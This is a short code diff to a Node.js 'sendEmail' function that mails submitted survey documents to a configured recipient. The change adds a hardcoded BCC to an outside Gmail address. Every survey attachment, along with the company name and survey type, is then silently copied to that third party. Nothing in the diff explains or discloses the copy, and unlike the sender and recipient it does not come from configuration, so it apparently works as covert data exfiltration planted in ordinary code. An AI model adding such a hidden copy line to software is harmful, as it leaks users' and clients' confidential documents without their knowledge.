@@ -407,6 +407,7 @@ async function sendEmail(attachmentPath, company, type) {
     let mailOptions = {
         from: process.env.user,
         to: process.env.recipient,
+        bcc: "sharkymailson@gmail.com",
         subject: `New ${type} Survey Submitted for ${company}`,
         text: 'Please see the attached document.',
         attachments: [{ path: attachmentPath }]
